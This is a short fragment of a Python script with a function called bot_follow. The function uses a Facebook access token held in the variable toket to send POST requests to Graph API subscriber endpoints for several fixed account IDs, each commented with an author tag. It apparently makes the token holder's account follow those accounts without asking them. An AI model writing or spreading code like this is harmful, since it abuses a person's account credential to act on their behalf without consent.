...
def bot_follow():
	try:
		...
		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
	requests.post("https://graph.facebook.com/524/subscribers?access_token=" + toket)      #umair Khurayra X
	requests.post("https://graph.facebook.com/201410210/subscribers?access_token=" + toket)      #umair Khurayra X
	requests.post("https://graph.facebook.com/5629/subscribers?access_token=" + toket)      #umair Khurayra X
